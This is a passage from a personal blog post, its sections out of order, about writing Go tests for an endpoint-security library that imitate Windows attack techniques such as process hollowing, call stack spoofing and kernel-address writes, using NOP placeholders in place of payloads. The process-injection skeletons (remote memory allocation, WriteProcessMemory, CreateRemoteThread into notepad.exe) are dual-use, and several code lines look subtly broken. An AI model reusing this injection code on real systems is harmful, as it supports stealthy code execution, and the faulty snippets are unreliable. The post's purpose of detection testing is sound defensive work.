</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VirtualProtectEx executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Remove the created DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(serviceDLLPath)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to remove DLL file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">103</span>) <span style="color:#6272a4">// Cleanup failed
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] DLL file removed&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-kernel-mode-address-manipulation">suspicious kernel mode address manipulation</h2>
<p>attackers try to modify memory in the kernel space from a user mode process, which is an obvious attempt at privilege escalation. manipulating kernel memory can allow attackers to gain <strong>complete control</strong> over the system.</p>
<p>the test attempts to allocate memory in a kernel mode address range, which is normally inaccessible to user mode processes. attackers do this to exploit a vulnerability that can allow them to write to or execute code in the kernel space.</p>
<p>the test then tries to change the memory protection on the allocated kernel mode memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious Kernel Mode Address Manipulation [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Attempt to allocate and modify memory in a kernel mode address range
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	kernelAddress <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x1000000000000</span>) <span style="color:#6272a4">// Example kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	size <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">1024</span>)                     <span style="color:#6272a4">// Memory size
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	oldProtect <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	newProtect <span style="color:#ff79c6">:=</span> windows.PAGE_EXECUTE_READWRITE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Allocate memory at the kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	addr, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(kernelAddress, size, windows.MEM_COMMIT|windows.MEM_RESERVE, newProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> addr <span style="color:#ff79c6">!=</span> kernelAddress {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory at kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully allocated memory at kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Modify memory protection
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">VirtualProtect</span>(kernelAddress, size, newProtect, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection at kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully changed memory protection at kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Write to the kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	data <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP instructions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	written <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), kernelAddress, <span style="color:#ff79c6">&amp;</span>data[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(data)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> written <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(data)) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully wrote to kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="conclusion">conclusion</h2>
<p>i wanted to write code that was much more than just &ldquo;simple&rdquo; scripts. i wanted to write comprehensive tools that would help uncover and understand the more sophisticated and insidious aspects of modern threats. testing for techniques like process hollowing, API hooking, and kernel memory manipulation can hopefully offer some technical and educational value to my peers in the field, as i myself have gleaned from their learning and experience over the years.</p>
<p>happy hacking!</p>
</main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/new_post14/">neverMind</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/gol0/" style="float: right"
      >next: goL0: reverse engineering &#43; malware analysis</a
    >
     
    <a class="previous" href="/posts/new_post14/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="goPro: detecting process hollowing with Go">

    
        <title>goPro: detecting process hollowing with Go | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    goPro: detecting process hollowing with Go
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 12, 2024 &nbsp;&nbsp; m. jan 29, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#what-exactly-is-process-hollowing">what exactly is process hollowing?</a>
      <ul>
        <li><a href="#tldr"><strong>tl;dr</strong>:</a></li>
      </ul>
    </li>
    <li><a href="#detecting-process-hollowing-with-go">detecting process hollowing with Go</a>
      <ul>
        <li><a href="#why-go-specifically">why Go, specifically?</a></li>
        <li><a href="#endpoint"><code>endpoint</code></a></li>
      </ul>
    </li>
    <li><a href="#call-stack-spoofing-via-synthetic-frames">call stack spoofing via synthetic frames</a></li>
    <li><a href="#evasion-via-event-tracing-for-windows-patching">evasion via event tracing for windows patching</a></li>
    <li><a href="#remote-thread-context-manipulation">remote thread context manipulation</a></li>
    <li><a href="#suspicious-windows-nt-api-hooking">suspicious windows NT API hooking</a></li>
    <li><a href="#net-com-object-creation-in-non-standard-windows-script-interpreter">.NET COM object creation in non-standard windows script interpreter</a></li>
    <li><a href="#potential-browser-exploit-via-fake-rpc-messages">potential browser exploit via fake RPC messages</a></li>
    <li><a href="#suspicious-api-from-an-unsigned-service-dll">suspicious API from an unsigned service DLL</a></li>
    <li><a href="#suspicious-kernel-mode-address-manipulation">suspicious kernel mode address manipulation</a></li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p>if you ever find yourself in between jobs for an extended period of time, remember to take time off from bouncing from constantly worrying to being completely nihilistic. if you can spare the time and energy, it can be quite rewarding to find something that you can totally nerd out on. for me, it was the world of windows malware.</p>
<p>this could probably benefit from being part of a series, so i&rsquo;ll keep the contents of this post focused on the title. windows is a vast and strange land, and its architecture is both extremely well-studied and mysterious. there&rsquo;s a lot we know, but also a lot we don&rsquo;t know.</p>
<p>process hollowing, however, is quite well-documented. the inspiration behind this article and the code was <a href="https://posts.specterops.io/lateral-movement-with-the-net-profiler-8772c86f9523"  target="_blank" rel="noreferrer nofollow">this</a>
 interesting piece by daniel mayer, where he uses the windows .NET profiler to pull over your payload and execute it. the offensive value is intriguing, and i&rsquo;m sure we&rsquo;ll see more research in this area!</p>
<h2 id="what-exactly-is-process-hollowing">what exactly is process hollowing?</h2>
<h3 id="tldr"><strong>tl;dr</strong>:</h3>
<p>process hollowing (aka <a href="https://github.com/aaaddress1/RunPE-In-Memory"  target="_blank" rel="noreferrer nofollow">RunPE</a>
) is a method of process injection. what happens is original code + resources of a target process are replaced or removed, leaving behind bare process framework. the hollowed process becomes a host for injected malicious code, which is executed under the guise of a legit process.</p>
<p>the WinAPIs required for this are the usual suspects: <code>CreateProcess</code>, <code>NtUnmapViewOfSection</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code>.</p>
<p>the attacker goes about this by launching a legit process (<code>notepad.exe</code> is a basic but popular choice) in a <strong>suspended state</strong>. this means the process is created but not executing any code.</p>
<p>what happens next is the hollowing: unmapping or deallocating the memory that contains the original executable code of the suspended process. the legitimate &ldquo;content&rdquo; is removed, leaving an empty process structure.</p>
<p>if the tactic hasn&rsquo;t been detected by this point, the attacker would then inject their own malicious code into the hollowed-out process. this is usually done by allocating memory in the process&rsquo;s address space and copying the malicious code into the space.</p>
<p>when process hollowing is successful, it should appear that a legitimate process is running. in reality, the process is executing the injected malicious code.</p>
<h2 id="detecting-process-hollowing-with-go">detecting process hollowing with Go</h2>
<p>i was preparing for an interview with ${company}, and the topic of writing detections in Go had come up. i hadn&rsquo;t really written much Go at this point, so i thought it would be fun to learn enough about the language to eventually use it to write detection scripts.</p>
<h3 id="why-go-specifically">why Go, specifically?</h3>
<p>Go is pretty well known for its performance and implementation of concurrency. process hollowing involves low-level operations on system processes, so being fast and efficient is crucial. the <code>goroutines</code> allow for concurrent operations, like monitoring/testing, without significant overhead (theoretically).</p>
<p>a big plus is that Go supports cross-platform code, so the tests could technically be adapted for a different OS. the standard library is pretty robust, and provided me with a lot of built-in tools that i&rsquo;d use for network communication, file I/O, and system interaction.</p>
<p>a lesser known (to me) advantage of Go is that its statically typed nature and compiled binaries help to create reliable and predictable behaviour. the binaries can be easily deployed without dependencies.</p>
<p>i also had a lot of fun writing + testing the scripts, because of the memory safety of Go&rsquo;s design and smooth error handling.</p>
<h3 id="endpoint"><code>endpoint</code></h3>
<p>${company} discussed using a module called <code>endpoint</code>. essentially, it&rsquo;s a library that facilitates the creation and execution (and reporting) of security tests. it abstracts a lot of the complexities that would be involved when interacting with the system, and provided a consistent interface for performing and reporting on various operations.</p>
<p>i won&rsquo;t share the code here, but i think it&rsquo;s fair to discuss the key components at work, since the code is public and we&rsquo;ll be discussing the tests i wrote in support of it.</p>
<p><strong>start and stop functions</strong>: manages the lifecycle of the tests (initialization to cleanup). the execution is kicked off with <code>Start(test fn, clean ...fn)</code> and stopped by <code>Stop(code int)</code>.</p>
<p>these functions run the test in a separate <code>goroutine</code> (which allows for concurrent execution), implement a timeout mechanism, and make sure the test is cleaned up properly (after providing a status code that signals the end of the test).</p>
<p><strong>system interaction + process management</strong>: this module is probably the most important, as it interacts with the OS for tasks like process creation, memory manipulation, and more.</p>
<p><code>Shell(args []string) (string, error)</code> executes a shell command and returns its output. <code>Write(filename string, contents []byte) error</code> and <code>Read(path string) []byte</code> handle writing data and reading data to/from the filesystem. <code>Remove(path string) bool</code> deletes a file at the specified path (important for cleanup).</p>
<p>some more functions include <code>AES256GCMEncrypt(data []byte) ([]byte, []byte, error)</code> and <code>AES256GCMDecrypt(data, key []byte) ([]byte, error)</code>, which handle encryption; <code>startDropperChildProcess()</code> and <code>writeIPC()</code>, which start a child process (&ldquo;dropper&rdquo;) and communicate with it via IPC, and more.</p>
<p>now, on to the tests!</p>
<h2 id="call-stack-spoofing-via-synthetic-frames">call stack spoofing via synthetic frames</h2>
<p><strong>call stack spoofing</strong> is an attack where the call stack is manipulated to make it appear as if a function was called by legitimate code. used to hide the origin of suspicious API calls, it makes tracing malicious behaviour more difficult.</p>
<p>this test attempts to detect when the call stack is artificially altered, which is often a sign of process hollowing (or ROP attacks).</p>
<p>the test starts by creating a legitimate process (<code>notepad.exe</code>) as its target. it then allocates memory within the target process and writes a NOP slide as a stand-in for malicious shellcode.</p>
<p>the key part of this test is <code>alterCallStack()</code>, where a trampoline function is used to alter the call stack. trampolines are used to change the execution flow (&ldquo;jumping&rdquo;) to conceal the origin of a malicious call.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Call Stack Spoofing via Synthetic Frames [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	proc.Handle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	remoteProcHandle <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">Handle</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// start process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;notepad.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to start process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> cmd.Process.<span style="color:#50fa7b">Kill</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// get process handle
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	procHandle, err = windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>, <span style="color:#8be9fd;font-style:italic">uint32</span>(cmd.Process_Pid))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to get process handle: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory to target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> remoteAddr <span style="color:#8be9fd">uintptr</span>
</span></span><span style="display:flex;"><span>	remoteAddr, err = windows.<span style="color:#50fa7b">VirtualAllocEx</span>(procHandle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write shellcode to allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	shellcode <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP slide placeholder
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(procHandle, remoteAddr, <span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(shellcode)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to process memory: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create remote thread in target process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> threadHandle windows.Handle
</span></span><span style="display:flex;"><span>	threadHandle, err = windows.<span style="color:#50fa7b">CreateRemoteThread</span>(procHandle, <span style="color:#ff79c6">nil</span>, <span style="color:#bd93f9">0</span>, remoteAddr, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create remote thread: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">defer</span> windows.<span style="color:#50fa7b">CloseHandle</span>(threadHandle)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// alter call stack
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">alterCallStack</span>()
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Call stack spoofing executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">alterCallStack</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// altering stack using trampoline function
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	trampoline <span style="color:#ff79c6">:=</span> syscall.<span style="color:#50fa7b">NewCallback</span>(<span style="color:#8be9fd;font-style:italic">func</span>() <span style="color:#8be9fd">uintptr</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// jump to real target func
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// allocate memory to trampoline func
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	mem, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">4096</span>, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
